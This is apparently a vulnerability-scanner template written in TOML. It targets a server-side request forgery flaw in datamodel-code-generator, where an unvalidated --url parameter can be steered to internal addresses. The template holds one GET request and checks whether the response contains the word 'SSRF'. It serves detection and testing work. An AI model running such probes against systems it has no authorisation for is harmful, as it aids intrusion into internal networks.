[info]
author = "ave"
description = "验证datamodel-code-generator SSRF漏洞：工具未对--url参数做主机/IP校验，允许重定向至内网地址并反射响应体到生成的Python代码中"
id = "POC-AVE-2026-0728"
name = "CVE-2026-54691 PoC"
severity = "high"
tags = ["ave-2026-0728"]
vuln_id = [
    "CVE-2026-54691",
    "AVE-2026-0728",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["SSRF"]
